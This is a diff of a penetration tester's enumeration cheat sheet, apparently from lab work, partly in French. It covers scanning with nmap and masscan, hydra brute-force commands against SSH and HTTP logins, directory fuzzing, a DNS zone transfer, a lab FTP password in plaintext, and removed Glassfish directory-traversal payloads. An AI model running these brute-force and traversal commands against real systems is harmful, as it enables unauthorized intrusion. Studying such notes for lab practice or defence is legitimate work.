@@ -1,17 +1,17 @@
 # Network enum
 
+
+
+
 ## Discover Hosts
-
-### IP: NMap
-
-    # nmap 10.10.10.4/24
-    # nmap 10.10.10.1-255
+### IP: Netdiscover
+    # netdiscover -r 192.168.206.0/24
 
 
 ### Netbios: Nbtscan
     Scan for Netbios Hosts
     Url: http://www.inetcat.org/software/nbtscan.html
-    # nbtscan 10.10.10.4/24
+    # nbtscan 192.168.206.0/24
 
 
 
@@ -19,10 +19,8 @@
 =============================================================
 ## Port scanner
 ### Nmap
-    # nmap 10.10.10.4
-    # nmap -A  10.10.10.4
-    # nmap -sV -sC -p- 10.10.10.4
-    # nmap -sU 10.10.10.4
+    # nmap -sV -A  192.168.206.23
+    # nmap -sV -sC -p- 10.10.10.93
         -sV : Attempts to determine the version of the service running on port
         -sC : Scan with default NSE scripts. Considered useful for discovery and safe
         -A   : Enables OS detection, version detection, script scanning, and traceroute
@@ -30,15 +28,21 @@
         -oN nmap.log : output normal file
           
 
+### Unicornscan 
+    unicorn
+
+### One Two Punch
+    Use unicorn to scan open ports, then nmap to identify services
+    https://github.com/superkojiman/onetwopunch
+
+
 ### Nmap + masscan
     masscan -p1-65535 10.10.10.71 --rate=1000 -e tun0 > ports
     ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
     nmap -Pn -A -p$ports 10.10.10.71
 
-
-## Ports identification 
+## Tools for ports
 http://www.0daysecurity.com/penetration-testing/enumeration.html
-
 
 =============================================================
 ## 21: Ftp
@@ -71,32 +75,17 @@ Msfconsole password list
 
 Mirror the site
 ```
-wget --mirror 'ftp://ftp_user:ftp_passwd@tally.htb.local'
+wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@tally.htb.local'
 ```
 
-OpenSSH < 7.7 >: CVE-2018-15473: Username enumeration 
-    python script
-    nmap ?
     
-
 
 =============================================================
 ## 22: Ssh
-
 ### Hydra
     # hydra -l root -e nsr -V -o hydra.log -t8 -f ssh://raven.local
-    # hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.4 ssh
-    # hydra -L username_list.txt -P password_list.txt /usr/share/wordlists/rockyou.txt ssh -t 4
-
-    -l : username
-    -L : file with usernames
-    -P : file with password list
-    -e nsr : test name as password, empty password, reverse name as password
-    -o : output file
-    -f : Stop at first ok
-    -t 4 : 4 threads
-
-    
+    hydra -l (found_name) -P password.lst 192.168.168.168 ssh
+    hydra -L username_list.txt -P password_list.txt 192.168.168.168 ssh -t 4
 =============================================================
 ## 23: Telnet
     # nmap -p 23 --script telnet-brute --script-args userdb=users.lst,passdb=/usr/share/john/password.lst,telnet-brute.timeout=8s <target>
@@ -107,49 +96,30 @@ OpenSSH < 7.7 >: CVE-2018-15473: Username enumeration
 Reverse DNS
 	
 	$ dig -x 10.13.37.10 @10.13.37.10
-
-    ; <<>> DiG 9.11.4-P2-3-Debian <<>> -x 10.13.37.10 @10.13.37.10
-    ;; global options: +cmd
-    ;; Got answer:
-    ;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 30729
-    ;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
-    ;; WARNING: recursion requested but not available
-
-    ;; OPT PSEUDOSECTION:
-    ; EDNS: version: 0, flags:; udp: 4096
-    ;; QUESTION SECTION:
-    ;10.37.13.10.in-addr.arpa.	IN	PTR
-
-    ;; AUTHORITY SECTION:
-    37.13.10.in-addr.arpa.	604800	IN	SOA	www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800  <====== FQDN
-
-    ;; Query time: 98 msec
-    ;; SERVER: 10.13.37.10#53(10.13.37.10)
-    ;; WHEN: lun. nov. 18 12:40:08 CET 2019
-    ;; MSG SIZE  rcvd: 109
+	=> fqdn
 
 
 DNS Zone Transfert (axfr)
 Permet d'obtenir des noms dns qui seront utilisés pour le routage des serveurs web.
 
+```
+# dig axfr @10.10.10.13 cronos.htb
 
-    # dig axfr @10.10.10.13 cronos.htb
-
-    ; <<>> DiG 9.11.4-P2-3-Debian <<>> axfr @10.10.10.13 cronos.htb
-    ; (1 server found)
-    ;; global options: +cmd
-    cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
-    cronos.htb.		604800	IN	NS	ns1.cronos.htb.
-    cronos.htb.		604800	IN	A	10.10.10.13
-    admin.cronos.htb.	604800	IN	A	10.10.10.13
-    ns1.cronos.htb.		604800	IN	A	10.10.10.13
-    www.cronos.htb.		604800	IN	A	10.10.10.13
-    cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
-    ;; Query time: 29 msec
-    ;; SERVER: 10.10.10.13#53(10.10.10.13)
-    ;; WHEN: dim. sept. 08 11:47:44 CEST 2019
-    ;; XFR size: 7 records (messages 1, bytes 203)
-
+; <<>> DiG 9.11.4-P2-3-Debian <<>> axfr @10.10.10.13 cronos.htb
+; (1 server found)
+;; global options: +cmd
+cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+cronos.htb.		604800	IN	NS	ns1.cronos.htb.
+cronos.htb.		604800	IN	A	10.10.10.13
+admin.cronos.htb.	604800	IN	A	10.10.10.13
+ns1.cronos.htb.		604800	IN	A	10.10.10.13
+www.cronos.htb.		604800	IN	A	10.10.10.13
+cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+;; Query time: 29 msec
+;; SERVER: 10.10.10.13#53(10.10.10.13)
+;; WHEN: dim. sept. 08 11:47:44 CEST 2019
+;; XFR size: 7 records (messages 1, bytes 203)
+```
 
 
 
@@ -160,40 +130,31 @@ Permet d'obtenir des noms dns qui seront utilisés pour le routage des serveurs 
 =============================================================
 ## 80: HTTP
 
-### robots.txt
+### Magic files
     /robots.txt
-
-### src comments
     Comments in the HTML source code.
 
-### src hidden
 
-    ### src comments
+### Nman Enum script
+    $ nmap -script http-enum.nse -p80 192.168.168.168
 
-### Dir brute force
-
-    /usr/share/wordlists/dirb/common.txt
-    /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      
-    /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  
-     
-    IIS : https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt
-    Sharepoint : /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt
-
-    Listes:
-    https://github.com/digination/dirbuster-ng/tree/master/wordlists
-    https://github.com/danielmiessler/SecLists/archive/master.zip
-   
-
-#### Dirbuster
+### Dirbuster
+    Find hidden files & dir
     https://github.com/digination/dirbuster-ng
     # dirb http://10.10.10.93
+    # dirb http://10.10.10.93/aspnet_client/system_web/ fuzz.txt -r                        : -r dont search recurvively
     # dirb http://10.10.10.93/ /usr/share/wordlists/dirb/common.txt -r
-
-    -r dont search recurvively
-
+    # dirb http://10.10.10.24/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
 
-#### Gobuster
+
+### Nikto
+    Identify server
+    https://github.com/sullo/nikto
+    $ nikto -host xxx
+    $ nikto -h 192.168.168.168 -p (port)
+
+### Gobuster
     Find hidden files & dir
     https://github.com/OJ/gobuster
     wget https://github.com/OJ/gobuster/releases/download/v3.0.1/gobuster-linux-amd64.7z
@@ -201,27 +162,26 @@ Permet d'obtenir des noms dns qui seront utilisés pour le routage des serveurs 
     directory-list-2.3-medium.txt : assez longue
     /opt/gobuster/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.16.27.142  -l -x html,php,js,txt
 
-    -k : skip HTTPS ssl verification
+    HTTPS: -k : skipp ssl verification
     
+    common.txt : plus rapide
+    # /opt/gobuster/gobuster dir -u http://10.10.10.13  -l -x html,php,js,txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
 
     # gobuster -u http://172.16.27.142/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x html,php -s 200,301,401,403
     # ./gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.16.27.142  -l -x html,php,js,txt
     # gobuster -u http://192.168.168.168/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -s 200,204,301,302,307,403,500 –e
 
-
-#### Nikto
-    Identify server
-    https://github.com/sullo/nikto
-    $ nikto -h 192.168.168.168 -p 80
-
-
 ### Curl
     curl http://192.168.168.168/admin.php?action=users&login=0
 
     
-   
-
-
+### Web server Common Directories
+    https://github.com/digination/dirbuster-ng/tree/master/wordlists
+    IIS : https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt
+    Kali Dictionaries:
+    /usr/share/wordlists/dirb/common.txt
+    /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
 ### Cewl
     Get word list from web site
@@ -230,14 +190,12 @@ Permet d'obtenir des noms dns qui seront utilisés pour le routage des serveurs 
 
 ### wfuzz
 
-Fuzz directory name
     Si touts les url retournent un 200 OK, on fuzz sur la longueur de la réponse
     # wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bart.htb/FUZZ/
     000018:  C=200    630 L     3775 W        158607 Ch       "2006"
     000017:  C=200    630 L     3775 W        158607 Ch       "download"
     000026:  C=200    630 L     3775 W        158607 Ch       "about"
-    => 158607 
-
+    => 158607
 
     # wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bart.htb/FUZZ/ --hh 158607
     ==================================================================
@@ -248,40 +206,10 @@ Fuzz directory name
     000067:  C=200    548 L     2412 W        35529 Ch        "forum"
     001614:  C=200     80 L      221 W         3423 Ch        "monitor"
 
-Fuzz data in HTTP
-    wfuzz -z file,/usr/share/wordlists/rockyou.txt -d "password=FUZZ&remember=yes&login=Log+In&proc_login=true" -b PHPSESSID=s1soh390fah01sfvojpgovrc15 --hh 13949  https://10.10.10.43/db/index.php 
-
-Fuzz command and argument
-    # wfuzz -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt  http://10.13.37.10/search?FUZZ=cmd
-    # wfuzz -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=178  http://10.13.37.10/search?FUZZ=cmd
-    # wfuzz -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=178  http://10.13.37.10/search?category=FUZZ
-
 
 ### Bruteforce HTTP Basic Auth
     
-    $ hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f 10.10.10.157 http-get /monitoring
-
-
-### Bruteforce HTTP Form - Get 
-    
-    $ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.4 http-get-form "/login.php:username=^USER^&password=^PASS^:F=Login failed:H=Cookie\: PHPSESSIONID=ms0t93n23mc2bn2512ncv1ods4" -V
-
-
-### Bruteforce HTTP Form - Post
-    
-    $ # hydra -l admin -P /usr/share/wordlists/rockyou.txt www.securewebinc.jet http-post-form "/dirb_safe_dir_rf9EmcEIx/admin/login.php:username=^USER^&password=^PASS^:F=Wrong password:H=Cookie\: PHPSESSIONID=ms0t93n23mc2bn2512ncv1ods4" -V
-
-    Attention si la réponse est un 302 Redirect, hydra ne va pas suivre et va générer un faux positif.
-
-
-### HTTP Verbs
-    
-    Au lieu d'utiliser GET, tenter POST
-
-
-### HTTP Redirect
-    
-    Intercepter le redirect avec Burp
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f 10.10.10.157 http-get /monitoring
 
 
 ### Screenshot of url
@@ -292,7 +220,6 @@ Fuzz command and argument
 =============================================================
 
 ## Sharepoint
-
 ### Directory listing
     wget https://github.com/danielmiessler/SecLists/archive/master.zip
     /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt 
@@ -307,37 +234,18 @@ Fuzz command and argument
 ## Wordpress
 ### Wpscan
     # wpscan -u http://raven.local/wordpress -e
-    Note : 
+    Note : mysql Credentials location: /var/www/html/wordpress/wp-config.php
     wpscan --url http://forum.bart.htb/ -e
 
 
-### Dir structure
-
-Posts :
-    /index.php/2017/04/12/hello-world/
-    /index.php/jobs/apply/8/
-
-Uploaded files : 
-    /wp-content/uploads/%year%/%month%/%filename% 
-
-mysql Credentials location: 
-    /var/www/html/wordpress/wp-config.php
- 
+#### Dir structure
+  Posts :          /index.php/2017/04/12/hello-world/
+                   /index.php/jobs/apply/8/
+  Uploaded files : /wp-content/uploads/%year%/%month%/%filename% 
 
 =============================================================
 
 ## Glassfish
-
-    Java webapp server
-    Oracle, GlassFish Server Open Source Edition <=4.1 is vulnerable to both authenticated and unauthenticated Directory Traversal vulnerability
-    https://www.exploit-db.com/exploits/39441
-    GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
-    GET /theme/META-INF/json%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
-    GET /theme/META-INF/dojo%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
-    GET /theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
-    GET /theme/com/sun%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini 
-    GET /theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
-
 
 =============================================================
 
@@ -402,28 +310,27 @@ Web Distributed Authoring and Versioning (WebDAV) is an extension of the Hyperte
 =============================================================
 
 ## Drupal
-
-Drupal est un système de gestion de contenu (CMS) sous licence libre créé en 1999 et développé en PHP
-3 eme CMS le plus utilisé.
-
-
 ### Droopescan
     https://github.com/droope/droopescan
     pip install droopescan
     droopescan scan drupal -u http://10.10.10.9   (15 min scan...)
 
-### Classic Vuln
-    Drupalgeddon
-        Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution) 
-    Drupalgeddon 2
-        CVE-2018-7600
-        https://github.com/lorddemon/drupalgeddon2/blob/master/drupalgeddon2.py
-        PHP injection via les URLs « /user/register » et « /user/password ».
-        Patch en Drupal 7.58,   Drupal 8.3.9,  Drupal 8.4.6,  Drupal 8.5.1
-    Drupalgeddon 3
-        Le patch pour Drupalgeddon 2 a ouvert une faille...
-        Drupal < 7.58 (authenticated)
+=============================================================
 
+## Crawl php server
+    python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.9/ -e php -x 403,404 -t 50
+    Look for : 
+    phpinfo.php
+    /phpliteadmin
+    /dashboard
+    /admin
+    /admin.php
+    /login
+    /login.php
+
+=============================================================
+
+## Ruby on Rail
 
 
 
@@ -535,8 +442,7 @@ Drupal est un système de gestion de contenu (CMS) sous licence libre créé en 
 =============================================================
 ## 3000 : Node JS
 
-=> Potential JS Deserialisation exploit
-
+### xxx
 
 
 
